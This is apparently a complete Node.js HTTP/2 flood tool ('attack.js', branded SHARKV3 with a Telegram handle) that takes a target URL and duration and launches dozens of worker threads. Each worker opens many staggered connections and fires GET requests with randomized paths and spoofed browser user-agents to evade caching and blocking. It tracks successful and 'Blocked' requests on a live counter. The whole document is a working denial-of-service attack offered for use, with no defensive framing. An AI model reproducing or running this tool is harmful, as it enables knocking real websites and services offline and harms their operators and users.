const http2 = require('http2');
const { Worker, isMainThread, workerData } = require('worker_threads');
const { cpus } = require('os');
const readline = require('readline');
const net = require('net');

const THREADS = 16;
const CONNECTIONS_PER_WORKER = 50;
const POWER_MULTIPLIER = 4;
const WARMUP_TIME = 10000;
const MAX_INFLIGHT = 3000;
const STAGGER_DELAY = 90; // ms between each conn

let totalRequests = 0;
let successCount = 0;
let errorCount = 0;
let maxRps = 0;
let rpsLastSecond = 0;

const randomPath = () => '/' + Math.random().toString(36).substring(2, 12);
const randomUA = () =>
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/' +
  Math.floor(500 + Math.random() * 500) +
  '.36 (KHTML, like Gecko) Chrome/' +
  (90 + Math.floor(Math.random() * 10)) +
  '.0.' +
  Math.floor(1000 + Math.random() * 9999) +
  '.100 Safari/' +
  Math.floor(500 + Math.random() * 500);

if (isMainThread) {
  if (process.argv.length < 4) {
    console.error('Usage: node attack.js <target> <duration_secs>');
    process.exit(1);
  }

  const target = process.argv[2];
  const duration = parseInt(process.argv[3]);

  console.clear();
  console.log(`Warming up... Starting attack in 5s`);

  setTimeout(() => {
    console.clear();
    console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
    console.log(`===========================`);

    for (let i = 0; i < THREADS; i++) {
      new Worker(__filename, {
        workerData: { target, duration, initial: true },
      });
    }

    setTimeout(() => {
      for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
        new Worker(__filename, {
          workerData: { target, duration, initial: false },
        });
      }
    }, WARMUP_TIME);

    setInterval(() => {
      maxRps = Math.max(maxRps, rpsLastSecond);
      renderStats();
      rpsLastSecond = 0;
    }, 1000);
  }, WARMUP_TIME);

  function renderStats() {
    readline.cursorTo(process.stdout, 0, 0);
    readline.clearScreenDown(process.stdout);
    console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
    console.log(`===========================`);
    console.log(`total: ${totalRequests}`);
    console.log(`max-r: ${maxRps}`);
    console.log(`===========================`);
    console.log(`succes: ${successCount}`);
    console.log(`Blocked: ${errorCount}`);
  }

  const server = net.createServer((socket) => {
    socket.on('data', (data) => {
      const msg = data.toString();
      if (msg === 'req') {
        totalRequests++;
        rpsLastSecond++;
      } else if (msg === 'ok') {
        successCount++;
      } else if (msg === 'err') {
        errorCount++;
      }
    });
  });
  server.listen(9999);
} else {
  const { target, duration, initial } = workerData;
  const totalConns = initial ? CONNECTIONS_PER_WORKER : CONNECTIONS_PER_WORKER * POWER_MULTIPLIER;
  const end = Date.now() + duration * 1000;

  const socket = net.connect(9999, '127.0.0.1');
  const sendStat = (msg) => socket.write(msg);

  function sendOne(client, inflight) {
    if (Date.now() > end) return;
    if (inflight.count >= MAX_INFLIGHT) {
      return setTimeout(() => sendOne(client, inflight), 2);
    }

    try {
      inflight.count++;
      const req = client.request({
        ':path': randomPath(),
        ':method': 'GET',
        'user-agent': randomUA(),
      });

      req.on('response', () => {
        sendStat('ok');
        inflight.count--;
      });

      req.on('error', () => {
        sendStat('err');
        inflight.count--;
      });

      req.end();
      sendStat('req');
    } catch {
      inflight.count--;
      sendStat('err');
    }

    setImmediate(() => sendOne(client, inflight));
  }

  function createConnection(index) {
    setTimeout(() => {
      let client;
      try {
        client = http2.connect(target);
        client.on('error', () => {});
        client.on('close', () => setTimeout(() => createConnection(index), 100));
        client.on('connect', () => {
          const inflight = { count: 0 };
          for (let i = 0; i < 100; i++) sendOne(client, inflight);
        });
      } catch {
        setTimeout(() => createConnection(index), 250);
      }
    }, index * STAGGER_DELAY);
  }

  for (let i = 0; i < totalConns; i++) {
    createConnection(i);
  }
}
